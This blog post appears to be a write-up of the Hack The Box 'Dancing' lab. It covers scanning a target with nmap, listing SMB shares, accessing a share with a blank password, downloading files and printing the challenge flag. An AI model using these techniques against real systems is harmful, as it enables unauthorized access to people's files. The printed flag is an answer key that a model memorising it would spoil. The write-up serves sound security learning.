---
title: "[HTB] Dancing"
author: "Wook Lee"
date: "2024-06-17"
tags: ["hack the box"]
---

> _Hack The Box_ starting point, tier 0, very easy, #3 machine: Dancing.
> Lets' go!

![lets_go](./lets_go.gif)

</br>

##### TASK 1

What does 3-letter acronym SMB stand for?

```
Server Message Block
```

SMB protocol implements an application-layer network protocol used to access resources on a server, such as file shares and shared printers.

</br>

##### TASK 2

What port does SMB use to operate at?

```
445
```

When I researched about SMB, I found that SMB uses either IP port 139 or 445.

Port 139: SMB originally ran on top of NetBIOS using port 139. NetBIOS is an old transport layer that allows Windows computers to talk to each other on the same network.
Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.

</br>

##### TASK 3

what is the service name for port 445 that came up in our Nmap scan?

```
microsoft-ds
```

```zsh
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-bozzgppq95]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.1.12
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-17 17:42 BST
Nmap scan report for 10.129.1.12
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

</br>

##### TASK 4

What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

```
-L
```

```zsh
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-bozzgppq95]─[~]
└──╼ [★]$ smbclient --help
Usage: smbclient [OPTIONS] service <password>
-M, --message=HOST Send message
-I, --ip-address=IP Use this IP to connect to
-E, --stderr Write messages to stderr
instead of stdout
-L, --list=HOST Get a list of shares available
on a host
-T, --tar=<c|x>IXFvgbNan Command line tar
-D, --directory=DIR Start from directory
-c, --command=STRING Execute semicolon separated
commands
-b, --send-buffer=BYTES Changes the transmit/send buffer
-t, --timeout=SECONDS Changes the per-operation
timeout
-p, --port=PORT Port to connect to
-g, --grepable Produce grepable output
-q, --quiet Suppress help message
-B, --browse Browse SMB servers using DNS
```

</br>

##### TASK 5

How many shares are there on Dancing?

```
4
```

```zsh
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-bozzgppq95]─[~]
└──╼ [★]$ smbclient -L 10.129.1.12
Password for [WORKGROUP\leewookb]:

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    WorkShares      Disk

SMB1 disabled -- no workgroup available
```

</br>

##### TASK 6

What is the name of the share we are able to access in the end with a blank password?

```
WorkShares
```

Running the `smbclient -L 10.129.1.12` command, we can see that four separate shares are displayed. The default administrative shares often include the $ symbol at the end of their name to indicate they are hidden shares. As we can see that `ADMIN$` , `C$`, `IPC$` shares all include the symbol at the end. On the other hand, `WorkShares` share does not include this symbol, which is an indicator that it is a user-created, or custom, share.

</br>

##### TASK 7

What is the command we can use within the SMB shell to download the files we find?

```
get
```

```zsh
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-bozzgppq95]─[~]
└──╼ [★]$ smbclient \\\\10.129.1.12\\WorkShares
Password for [WORKGROUP\leewookb]:
Try "help" to get a list of possible commands.
smb: \> ls
. D 0 Mon Mar 29 09:22:01 2021
.. D 0 Mon Mar 29 09:22:01 2021
Amy.J D 0 Mon Mar 29 10:08:24 2021
James.P D 0 Thu Jun 3 09:38:03 2021
```

In order to connect to the custom share, `WorkShares` , we need to specify the target's IP address and the target SMB share. The command is `smbclient \\\\{target_IP}\\{target_share}`.

- The double backslashes ('\\\\') are used to escape the backslashes in the path.
- The path `{target_IP}\\WorkShares` refers to the "WorkShares" share on the machine identified by '{target_IP}'
- We were able to connect to the custom share and I used the command ls to list all of the contents of the directories within the share. The command showed us two directories, one is `Amy.J` and another is `James.P` .

```zsh
smb: \> cd Amy.J
smb: \Amy.J\> ls
. D 0 Mon Mar 29 10:08:24 2021
.. D 0 Mon Mar 29 10:08:24 2021
worknotes.txt A 94 Fri Mar 26 11:00:37 2021


    5114111 blocks of size 4096. 1733826 blocks available

smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> ls
. D 0 Mon Mar 29 09:22:01 2021
.. D 0 Mon Mar 29 09:22:01 2021
Amy.J D 0 Mon Mar 29 10:08:24 2021
James.P D 0 Thu Jun 3 09:38:03 2021

    5114111 blocks of size 4096. 1733810 blocks available

smb: \> cd James.P\
smb: \James.P\> ls
. D 0 Thu Jun 3 09:38:03 2021
.. D 0 Thu Jun 3 09:38:03 2021
flag.txt A 32 Mon Mar 29 10:26:57 2021

    5114111 blocks of size 4096. 1733785 blocks available

smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.7 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \James.P\>
```

I used `cd` command to visit Amy.J folder and found 'worknotes.txt' file, which we can download using the `get` command. Also we moved inside the James.P directory as well and downloaded the flag.txt file.

```zsh
smb: \James.P\> quit
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-bozzgppq95]─[~]
└──╼ [★]$ ls
Desktop flag.txt IXFvgbNan my_data Templates worknotes.txt
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-bozzgppq95]─[~]
└──╼ [★]$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

Since we got everything we needed from the share, we can exit out of the SMB server and the files we downloaded are saved inside the location where we ran our `smbclient` command from.
<br/>
<br/>

##### SUBMIT FLAG

submit root flag

```
5f61c10dffbc77a704d76016a22f1664
```

![dancing_cleared](./dancing_img.png)
